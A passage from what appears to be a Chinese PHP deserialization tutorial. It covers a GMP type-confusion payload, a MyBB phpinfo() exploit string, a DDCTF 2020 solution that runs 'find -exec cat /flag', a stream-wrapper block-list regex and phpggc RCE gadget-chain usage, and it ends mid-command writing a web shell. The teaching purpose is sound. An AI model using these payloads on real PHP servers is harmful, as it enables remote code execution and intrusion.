class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<span class="hljs-variable">$obj</span>-&gt;aa = <span class="hljs-number">1</span>;<span class="hljs-variable">$obj</span>-&gt;bb = <span class="hljs-number">2</span>;<span class="hljs-variable">$obj2</span> = <span class="hljs-keyword">new</span> b;<span class="hljs-variable">$obj3</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<span class="hljs-variable">$obj3</span>-&gt;aa =<span class="hljs-number">2</span>;<span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;1&quot;;a:3:&#123;s:2:&quot;aa&quot;;s:2:&quot;hi&quot;;s:2:&quot;bb&quot;;s:2:&quot;hi&quot;;i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:2;&#125;&#125;&#x27;</span>;<span class="hljs-variable">$exploit</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;<span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$exploit</span>);<span class="hljs-variable">$obj4</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;var_dump(<span class="hljs-variable">$x</span>);var_dump(<span class="hljs-variable">$obj</span>);var_dump(<span class="hljs-variable">$obj2</span>);    var_dump(<span class="hljs-variable">$obj3</span>);var_dump(<span class="hljs-variable">$obj4</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>让我们来看看结果是什么？</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;  [<span class="hljs-number">0</span>]=&gt;  &amp;<span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)&#125;<span class="hljs-keyword">object</span>(<span class="hljs-built_in">stdClass</span>)<span class="hljs-comment">#1 (3) &#123;</span>  [<span class="hljs-string">&quot;aa&quot;</span>]=&gt;  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;hi&quot;</span>  [<span class="hljs-string">&quot;bb&quot;</span>]=&gt;  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;hi&quot;</span>  [<span class="hljs-number">0</span>]=&gt;  <span class="hljs-keyword">object</span>(obj)<span class="hljs-comment">#5 (1) &#123;</span>    [<span class="hljs-string">&quot;ryat&quot;</span>]=&gt;    &amp;<span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)  &#125;&#125;<span class="hljs-keyword">object</span>(b)<span class="hljs-comment">#2 (1) &#123;</span>  [<span class="hljs-string">&quot;ryat&quot;</span>]=&gt;  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)&#125;<span class="hljs-keyword">object</span>(<span class="hljs-built_in">stdClass</span>)<span class="hljs-comment">#3 (1) &#123;</span>  [<span class="hljs-string">&quot;aa&quot;</span>]=&gt;  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)&#125;<span class="hljs-keyword">object</span>(<span class="hljs-built_in">stdClass</span>)<span class="hljs-comment">#4 (0) &#123;</span>&#125;</code></pre></div><p>这个payload的效果将$obj的已有属性修改为我们传入的值</p><p>但如果我将反序列化的类改成b会发生什么呢？</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;1&quot;;a:3:&#123;s:2:&quot;aa&quot;;s:2:&quot;hi&quot;;s:2:&quot;bb&quot;;s:2:&quot;hi&quot;;i:0;O:1:&quot;b&quot;:1:&#123;s:4:&quot;ryat&quot;;R:2;&#125;&#125;&#x27;</span>;</code></pre></div><p>很显然的是，并不会影响到其他的类变量</p><p>如果我们给class b加一个__Wakeup函数，那么又会产生一样的效果。</p><p>但如果我们把wakeup魔术方法中的变量设置为2</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ryat = <span class="hljs-number">2</span>;    &#125;&#125;</code></pre></div><p>返回的结果可以看出来，我们成功修改了第二个声明的对象。</p><p>但如果我们把ryat改为4，那么页面会直接返回500，因为我们修改了没有分配的对象空间。</p><p>在完成前面的试验后，我们可以把漏洞的利用条件简化一下。</p><p>如果我们有一个可控的<strong>反序列化入口</strong>，目标<strong>后端PHP安装了GMP插件</strong>（这个插件在原版php中不是默认安装的，但部分打包环境中会自带），如果我们找到一个<strong>可控的<code>__wakeup</code>魔术方法</strong>，我们就可以修改反序列化前声明的对象属性，并配合场景产生实际的安全问题。</p><p>如果目标的php版本在5.6 &lt;= 5.6.11中，我们可以直接使用内置的魔术方法来触发这个漏洞。</p><div class="hljs code-wrapper"><pre><code class="hljs php">var_dump(unserialize(<span class="hljs-string">&#x27;a:2:&#123;i:0;C:3:&quot;GMP&quot;:17:&#123;s:4:&quot;1234&quot;;a:0:&#123;&#125;&#125;i:1;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#x27;</span>));</code></pre></div><p>具体的mybb以及利用可以在参考连接中查看。</p><h3 id="mybb利用"><a href="#mybb利用" class="headerlink" title="mybb利用"></a>mybb利用</h3><div class="hljs code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;C:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;GMP&quot;</span>:<span class="hljs-number">106</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;5&quot;</span>;a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;cache&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;index&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span>;&#125;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;DateInterval&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;y&quot;</span>;R:<span class="hljs-number">2</span>;&#125;&#125;&#125;&#125;</code></pre></div><h3 id="ecsho4-0-7利用"><a href="#ecsho4-0-7利用" class="headerlink" title="ecsho4.0.7利用"></a>ecsho4.0.7利用</h3><h3 id="例题：ddctf-web4-Overwrite-Me"><a href="#例题：ddctf-web4-Overwrite-Me" class="headerlink" title="例题：ddctf web4 Overwrite Me"></a>例题：ddctf web4 Overwrite Me</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;kw0ng = <span class="hljs-number">2</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> system(<span class="hljs-string">&#x27;find /HackersForever &#x27;</span> . escapeshellcmd(<span class="hljs-keyword">$this</span>-&gt;flag));    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HintClass</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;hint))        &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);        &#125;        <span class="hljs-keyword">$this</span>-&gt;execute(<span class="hljs-keyword">$this</span>-&gt;hint);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowOff</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;contents();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;        <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;page-&gt;cont);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiddleMan</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$func</span> = <span class="hljs-keyword">$this</span>-&gt;content;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);    &#125;&#125;<span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> ShowOff();<span class="hljs-variable">$bullet</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bullet&#x27;</span>];<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$bullet</span>))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Give Me Something!&quot;</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bullet</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;    <span class="hljs-variable">$infos</span> = <span class="hljs-keyword">new</span> Info();&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-variable">$obstacle1</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;    <span class="hljs-variable">$obstacle2</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;    <span class="hljs-variable">$mc</span> = <span class="hljs-keyword">new</span> MyClass();    <span class="hljs-variable">$mc</span>-&gt;flag = <span class="hljs-string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;    @unserialize(<span class="hljs-variable">$bullet</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$mc</span>-&gt;get_flag();&#125;</code></pre></div><p><strong>思路1</strong>：</p><ul><li><p>ShowOff类的__wake_up调用MiddleMan的__unset</p></li><li><p>然后利用$func调用MyClass的get_flag方法</p></li><li><p>find 方法可以执行命令。前提是存在/HackersForever</p></li><li><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//error_reporting(0);</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;-exec cat /flag &#123;&#125; ;&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;kw0ng = <span class="hljs-number">2</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> system(<span class="hljs-string">&#x27;find /HackersForever &#x27;</span> . escapeshellcmd(<span class="hljs-keyword">$this</span>-&gt;flag));    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HintClass</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;hint))        &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);        &#125;        <span class="hljs-keyword">$this</span>-&gt;execute(<span class="hljs-keyword">$this</span>-&gt;hint);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowOff</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<span class="hljs-comment">//        echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;;</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;contents();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;        <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;page-&gt;cont);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiddleMan</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$func</span> = <span class="hljs-keyword">$this</span>-&gt;content;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ShowOff();<span class="hljs-variable">$a</span>-&gt;page  = <span class="hljs-keyword">new</span> MiddleMan();<span class="hljs-variable">$a</span>-&gt;page-&gt;content = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> MyClass(),<span class="hljs-string">&#x27;get_flag&#x27;</span>);<span class="hljs-variable">$payload</span> = urlencode(serialize(<span class="hljs-variable">$a</span>));<span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;http://127.0.0.1/ddctf2020/?bullet=&#x27;</span>.<span class="hljs-variable">$payload</span>),<span class="hljs-string">&quot;\n&quot;</span>;</code></pre></div></li></ul><p><strong>思路2</strong>：</p><ul><li><p>利用php的GMP类型混淆漏洞</p></li><li><p>两种利用方式，一种是利用有<code>__wakeup</code>的类，一种是利用<code>DateInterval</code></p></li><li><p>利用方式1：MyClass-&gt;__wake_up</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;1&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:14:&quot;-exec cat &#123;&#125; ;&quot;;i:0;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:2;&#125;&#125;&#x27;</span>;<span class="hljs-variable">$bullet</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;</code></pre></div><p>最后一个<code>O</code>类型里面是存在<code>__wakeup</code>且<code>__wakeup</code>的内容是给属性赋值的类，关键是要覆盖的类必须是指定顺序实例化，比如这里，<code>MyClass</code>是第四个实例化，所以<code>MyClass</code>的<code>__wakeup()</code>必须是</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;kw0ng = <span class="hljs-number">4</span>;&#125;</code></pre></div><p>但是这里的代码写死了2，用这个没法执行。还是得用DateInterval</p></li><li><p>利用方式2：DateInterval</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;4&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:20:&quot;-exec cat /flag &#123;&#125; ;&quot;;i:0;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#x27;</span>;<span class="hljs-variable">$exploit</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;</code></pre></div></li></ul><h2 id="0x09-php反序列化语句生成工具：phpggc"><a href="#0x09-php反序列化语句生成工具：phpggc" class="headerlink" title="0x09 php反序列化语句生成工具：phpggc"></a>0x09 php反序列化语句生成工具：<a href="https://github.com/ambionics/phpggc">phpggc</a></h2><p>可以生成各种框架的利用链、phar文件等</p><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ambionics/phpggc.git</code></pre></div><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>Run <code>./phpggc -l</code> to obtain a list of gadget chains:</p><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ./phpggc -lGadget Chains-------------NAME                                      VERSION                        TYPE             VECTOR         I    CodeIgniter4/RCE1                         4.0.0-beta.1 &lt;= 4.0.0-rc.4     rce              __destruct          CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.0.3+           rce              __destruct          Doctrine/FW1                              ?                              file_write       __toString     *    Drupal7/FD1                               7.0 &lt; ?                        file_delete      __destruct     *    Drupal7/RCE1                              7.0.8 &lt; ?                      rce              __destruct     *    Guzzle/FW1                                6.0.0 &lt;= 6.3.3+                file_write       __destruct          Guzzle/INFO1                              6.0.0 &lt;= 6.3.2                 phpinfo()        __destruct     *    Guzzle/RCE1                               6.0.0 &lt;= 6.3.2                 rce              __destruct     *    Laminas/FD1                               &lt;= 2.11.2                      file_delete      __destruct          Laravel/RCE1                              5.4.27                         rce              __destruct          Laravel/RCE2                              5.5.39                         rce              __destruct          Laravel/RCE3                              5.5.39                         rce              __destruct     *    Laravel/RCE4                              5.5.39                         rce              __destruct          Laravel/RCE5                              5.8.30                         rce              __destruct     *    Laravel/RCE6                              5.5.*                          rce              __destruct     *    Magento/FW1                               ? &lt;= 1.9.4.0                   file_write       __destruct     *    Magento/SQLI1                             ? &lt;= 1.9.4.0                   sql_injection    __destruct          Monolog/RCE1                              1.18 &lt;= 2.0.2                  rce              __destruct          Monolog/RCE2                              1.5 &lt;= 1.17                    rce              __destruct          Monolog/RCE3                              1.1.0 &lt;= 1.10.0                rce              __destruct          Phalcon/RCE1                              &lt;= 1.2.2                       rce              __wakeup       *    Pydio/Guzzle/RCE1                         &lt; 8.2.2                        rce              __toString          Slim/RCE1                                 3.8.1                          rce              __toString          SwiftMailer/FD1                           -5.4.12+, -6.2.1+              file_delete      __destruct          SwiftMailer/FW1                           5.1.0 &lt;= 5.4.8                 file_write       __toString          SwiftMailer/FW2                           6.0.0 &lt;= 6.0.1                 file_write       __toString          SwiftMailer/FW3                           5.0.1                          file_write       __toString          SwiftMailer/FW4                           4.0.0 &lt;= ?                     file_write       __destruct          Symfony/FW1                               2.5.2                          file_write       DebugImport    *    Symfony/FW2                               3.4                            file_write       __destruct          Symfony/RCE1                              3.3                            rce              __destruct     *    Symfony/RCE2                              2.3.42 &lt; 2.6                   rce              __destruct     *    Symfony/RCE3                              2.6 &lt;= 2.8.32                  rce              __destruct     *    Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7    rce              __destruct     *    ThinkPHP/RCE1                             5.1.x-5.2.x                    rce              __destruct     *    WordPress/Dompdf/RCE1                     &lt;= 0.8.5+                      rce              __destruct     *    WordPress/Dompdf/RCE2                     0.7.0 &lt;= 0.8.4                 rce              __destruct     *    WordPress/Guzzle/RCE1                     4.0.0 &lt;= 6.4.1+                rce              __toString     *    WordPress/Guzzle/RCE2                     4.0.0 &lt;= 6.4.1+                rce              __destruct     *    WordPress/P/EmailSubscribers/RCE1         4.0 &lt;= 4.4.7+                  rce              __destruct     *    WordPress/P/EverestForms/RCE1             1.0 &lt;= 1.6.7+                  rce              __destruct     *    WordPress/P/WooCommerce/RCE1              3.4.0 &lt;= 4.1.0+                rce              __destruct     *    WordPress/P/YetAnotherStarsRating/RCE1    ? &lt;= 1.8.6                     rce              __destruct     *    Yii/RCE1                                  1.1.20                         rce              __wakeup       *    ZendFramework/FD1                         ? &lt;= 1.12.20                   file_delete      __destruct          ZendFramework/RCE1                        ? &lt;= 1.12.20                   rce              __destruct     *    ZendFramework/RCE2                        1.11.12 &lt;= 1.12.20             rce              __toString     *    ZendFramework/RCE3                        2.0.1 &lt;= ?                     rce              __destruct</code></pre></div><p>Filter gadget chains:</p><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ./phpggc -l laravelGadget Chains-------------NAME                                      VERSION                        TYPE             VECTOR         I    Laravel/RCE1                              5.4.27                         rce              __destruct          Laravel/RCE2                              5.5.39                         rce              __destruct          Laravel/RCE3                              5.5.39                         rce              __destruct     *    Laravel/RCE4                              5.5.39                         rce              __destruct          Laravel/RCE5                              5.8.30                         rce              __destruct     *    Laravel/RCE6                              5.5.*                          rce              __destruct     *</code></pre></div><p>Every gadget chain has:</p><ul><li>Name: Name of the framework/library</li><li>Version: Version of the framework/library for which gadgets are for</li><li>Type: Type of exploitation: RCE, File Write, File Read, Include…</li><li>Vector: the vector to trigger the chain after the unserialize (<code>__destruct()</code>, <code>__toString()</code>, <code>offsetGet()</code>, …)</li><li>Informations: Other informations about the chain</li></ul><p>Use <code>-i</code> to get detailed information about a chain:</p><div class="hljs code-wrapper"><pre><code class="hljs ada">$ ./phpggc -i symfony/rce1Name           : <span class="hljs-type">Symfony</span>/RCE1Version        : 3.3<span class="hljs-keyword">Type</span>           <span class="hljs-type">: </span>rceVector         : __<span class="hljs-type">destruct</span>Informations   : Exec through proc_open()./phpggc Symfony/RCE1 &lt;command&gt;</code></pre></div><p>Once you have selected a chain, run <code>./phpggc &lt;gadget-chain&gt; [parameters]</code> to obtain the payload. For instance, to obtain a payload for Monolog, you’d do:</p><div class="hljs code-wrapper"><pre><code class="hljs roboconf">$ ./phpggc monolog/rce1 assert &#x27;phpinfo()&#x27;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;<span class="hljs-attribute">s</span>:9:&quot;*socket&quot;;<span class="hljs-attribute">O</span>:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;<span class="hljs-attribute">r</span>:2;<span class="hljs-attribute">s</span>:13:&quot;*bufferSize&quot;;<span class="hljs-attribute">i</span>:-1;<span class="hljs-attribute">s</span>:9:&quot;*buffer&quot;;<span class="hljs-attribute">a</span>:1:&#123;i:0;<span class="hljs-attribute">a</span>:2:&#123;i:0;<span class="hljs-attribute">s</span>:10:&quot;phpinfo();&quot;;<span class="hljs-attribute">s</span>:5:&quot;level&quot;;<span class="hljs-attribute">N;&#125;&#125;s</span>:8:&quot;*level&quot;;<span class="hljs-attribute">N;s</span>:14:&quot;*initialized&quot;;<span class="hljs-attribute">b</span>:1;<span class="hljs-attribute">s</span>:14:&quot;*bufferLimit&quot;;<span class="hljs-attribute">i</span>:-1;<span class="hljs-attribute">s</span>:13:&quot;*processors&quot;;<span class="hljs-attribute">a</span>:2:&#123;i:0;<span class="hljs-attribute">s</span>:7:&quot;current&quot;;<span class="hljs-attribute">i</span>:1;<span class="hljs-attribute">s</span>:6:&quot;assert&quot;;&#125;&#125;&#125;</code></pre></div><p>For a file write using SwiftMailer, you’d do:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">$ echo <span class="hljs-string">&#x27;It works !&#x27;</span> &gt; <span class="hljs-regexp">/tmp/</span>data$ .<span class="hljs-regexp">/phpggc swiftmailer/</span>fw1 <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.php <span 